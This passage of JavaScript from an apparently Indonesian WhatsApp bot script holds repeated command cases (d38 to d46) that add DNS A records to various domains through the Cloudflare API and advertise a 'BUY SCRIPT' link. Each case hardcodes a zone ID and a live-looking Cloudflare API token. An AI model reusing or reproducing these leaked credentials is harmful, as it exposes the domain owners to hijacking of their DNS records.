                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break 
case  'd38': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "030c4af3a1a8e92bc3588ac2299ed43a";
               let apitoken = "4rLCTnbktVWjsYWfFoirZv40Aqau8i1EhfHW"
               let tld = "panelstore.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break 
case  'd39': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5db0180dee236c55b515e470b1c881a9";
               let apitoken = "pP5-0iHonRwOodb4yy8Hw6ZDIUbbYhKlt8-DYn_u"
               let tld = "hamstore.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break 
case  'd40': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a3ad988cf09653a26df5e0742a09fbfa";
               let apitoken = "rLQcwmBvgJr4VAi8A3D9SFE5irPr3QqjKX1vPI9n"
               let tld = "h-pay.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break 
case  'd41': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fa1d6885d43b5bfd024323b102fe6ac4";
               let apitoken = "CuPTil7EAP3V3KeUaTEAiaQNrp3SHh7vTJmX0er7"
               let tld = "panelprivate.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd42': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5ebd284514539471ab6794b64b921c17";
               let apitoken = "yUwxcwcE75-GAlyKHIwtDzmOZ2FYk4i1u20Vivac"
               let tld = "pannelku.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd43': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "24b924129fb7277c27056867215db8e1";
               let apitoken = "Cswpok9sVHyVdw2i-9cJDnMPBxnbzb-KlMD3XgOE"
               let tld = "nshhosting.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd44': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a112599ddfdd5a2bac5dc91864020015";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi"
               let tld = "panellstoree.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd45': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a1fa0ffcde9549bd36e9ae3de4b66b4a";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi"
               let tld = "panell.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+mau+buy+sc+DigitalBotz\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
AlwaysFaxzMd.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 });
}
break
case  'd46': {
    if (!isFaxzCreator) return replyalwaysfaxz(`*\`[#]\`* *SOK ASIK INI FITUR KHUSUS ALWAYSFAXZ*`)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4fc8192dd8160307100b207d308da80c";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi"
               let tld = "kayypedia.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyalwaysfaxz("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyalwaysfaxz("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyalwaysfaxz(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
                          const sukses = `┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Create By = _ÂlwâysFâxz_\n┗━━━━━━━━━━━━━━━━━━━`
           
           let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: sukses
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"COPY LINK\",\"id\":\"123456789\",\"copy_code\":\"${e['name']}\"}`
},
{
"name": "cta_url",
